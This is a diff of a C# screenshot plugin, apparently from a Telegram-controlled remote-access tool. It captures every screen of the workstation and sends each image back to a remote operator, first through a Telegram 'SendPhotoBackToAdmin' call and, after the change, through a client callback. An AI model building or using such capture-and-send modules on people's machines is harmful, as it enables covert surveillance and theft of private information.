@@ -1,4 +1,5 @@
-﻿using Sdk.Base;
+﻿using CommandLine;
+using Sdk.Base;
 using Sdk.Dependencies;
 using Sdk.Models;
 using Sdk.Telegram;
@@ -6,50 +7,43 @@ using System.Drawing.Imaging;
 
 namespace prtsc
 {
+    [Verb("prtsc", HelpText = "Get a screenshot of the workstation")]
     public class DllMain : Plugin
     {
-        private IPCAssistant _telegram;
-        private readonly ScreenUtility _screenUtility;
+        private readonly ScreenUtilities _screenUtilities;
 
         public DllMain()
         {
-            base.Name = "/prtsc";
-            base.Description = "Get a screenshot of the workstation.";
-
-            this._screenUtility = new ScreenUtility();
+            this._screenUtilities = new ScreenUtilities();
         }
 
-        public override void Dispatch()
+        public override void Execute()
         {
-            var screens = this._screenUtility.GetScreensBitmap();
+            var screens = this._screenUtilities.GetScreensBitmap();
 
             foreach (Bitmap screen in screens)
             {
-                var fileName = "";
-
-                fileName = Path.GetRandomFileName();
-                fileName = Path.GetFileNameWithoutExtension(fileName);
-                fileName += ".png";
+                var fileName = Path.GetRandomFileName();
+                fileName = Path.GetFileNameWithoutExtension(fileName) + ".png";
 
                 using MemoryStream buffer = new MemoryStream();
 
                 // save to buffer
                 screen.Save(buffer, ImageFormat.Png);
+
                 // reset position (important)
                 buffer.Position = 0;
 
-                this._telegram.SendPhotoBackToAdmin(buffer, fileName);
+                // send frame to client
+                this.ExecuteResultCallback(
+                    new ExecuteStreamResult()
+                    {
+                        Success = true,
+                        FileName = fileName,
+                        Stream = buffer
+                    }
+                );
             }
-        }
-
-        public override void Dispatch(ExecuteResult data)
-        {
-            throw new NotImplementedException();
-        }
-
-        public override void Initialize(IServiceLocator service)
-        {
-            this._telegram = service.ResolveInstance<IPCAssistant>();
         }
     }
 }
